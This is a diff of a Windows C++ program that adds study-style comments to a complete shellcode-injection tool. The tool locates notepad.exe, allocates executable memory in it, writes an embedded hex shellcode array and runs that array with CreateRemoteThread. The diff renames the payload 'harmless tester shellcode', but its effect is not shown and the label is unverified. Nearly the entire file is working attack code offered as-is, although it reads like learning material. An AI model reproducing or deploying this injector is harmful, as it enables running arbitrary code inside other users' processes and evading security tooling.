@@ -1,8 +1,18 @@
-#include <windows.h>
-#include <tlhelp32.h>
+// #include <windows.h> enables Windows API functions, allows us to call OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread, CloseHandle, etc. 
+// As well as defining types like DWORD, HANDLE, LPVOID
+// and constants like MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE
+// basically anything related to memory management, process/thread handling, and system level operations
+#include <windows.h> 
+
+// #include <tlhelp32.h> specifically enables functionality for interacting with running processes
+// so things like CreateToolhelp32Snapshot, PROCESSENTRY32, Process32First, Process32Next, etc. 
+// Needed to iterate through running processes and taking snapshots
+#include <tlhelp32.h> 
+
+// for input output
 #include <iostream>
 
-// Shellcode
+// harmless tester shellcode
 unsigned char shellcode[] =
 "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
 "\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b"
@@ -31,35 +41,40 @@ unsigned char shellcode[] =
 "\x41\x89\xda\xff\xd5";
 
 DWORD GetTargetPID(const wchar_t* procName) {
-    PROCESSENTRY32 entry;
-    entry.dwSize = sizeof(PROCESSENTRY32);
+    PROCESSENTRY32 entry;  // Struct to hold info about a process
+    entry.dwSize = sizeof(PROCESSENTRY32);  // Set the size before use
 
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (Process32First(snapshot, &entry)) {
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  // Take snapshot of all processes
+    if (Process32First(snapshot, &entry)) {  // Iterate through processes
         do {
-            if (!_wcsicmp(entry.szExeFile, procName)) {
-                CloseHandle(snapshot);
-                return entry.th32ProcessID;
+            if (!_wcsicmp(entry.szExeFile, procName)) {  // Compare process names, disregarding case
+                CloseHandle(snapshot);  // Clean up snapshot handle
+                return entry.th32ProcessID;   // Return the PID if match found
             }
-        } while (Process32Next(snapshot, &entry));
+        } while (Process32Next(snapshot, &entry)); // While there are more processes to iterate through
     }
-    CloseHandle(snapshot);
-    return 0;
+    CloseHandle(snapshot); // Clean up if no match found to avoid resource leaks (system resource/memory exhaustion)
+    return 0; // Return 0 if target process not found
 }
 
+// Performs shellcode injection
 int main() {
-    DWORD pid = GetTargetPID(L"notepad.exe");
+    DWORD pid = GetTargetPID(L"notepad.exe"); // Get PID of notepad.exe
     if (!pid) {
         std::cout << "Target process not found." << std::endl;
         return 1;
     }
 
+    // Open a handle to the target process with full access 
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) {
         std::cout << "Failed to open target process." << std::endl;
         return 1;
     }
 
+    // Allocate memory in the remote process (remote simply means a process different from the one executing this injector code) for the shellcode where
+    // hProcess is the target process, nullptr lets OS choose the address, sizeof(shellcode) ensures a sufficient size is allocated,
+    // MEM_COMMIT | MEM_RESERVE commits and reserves memory, and PAGE_EXECUTE_READWRITE makes it executable and writable
     LPVOID remoteMemory = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMemory) {
         std::cout << "Memory allocation failed." << std::endl;
@@ -67,14 +82,17 @@ int main() {
         return 1;
     }
 
+    // Write the shellcode into the allocated memory of the remote process
     SIZE_T bytesWritten;
     if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, sizeof(shellcode), &bytesWritten)) {
         std::cout << "Failed to write shellcode." << std::endl;
-        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
+        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE); // Deallocate previously allocated memory to prevent mem leaks
         CloseHandle(hProcess);
         return 1;
     }
 
+    // Create a thread (sequence of instructions) in the remote process that starts executing at the shellcode
+    // where hProcess is target process, nullptr is default security attributes, 0 is default stack size, remoteMemory is start address = beginning of shellcode
     HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMemory, nullptr, 0, nullptr);
     if (!hThread) {
         std::cout << "Failed to create remote thread." << std::endl;
@@ -83,11 +101,12 @@ int main() {
         return 1;
     }
 
-    WaitForSingleObject(hThread, INFINITE);
+    // Wait for the remote thread to finish executing
+    WaitForSingleObject(hThread, INFINITE);   
+    // Clean up handles
     CloseHandle(hThread);
     CloseHandle(hProcess);
 
     std::cout << "Shellcode injected successfully." << std::endl;
     return 0;
-    ExitProcess(0);
 }
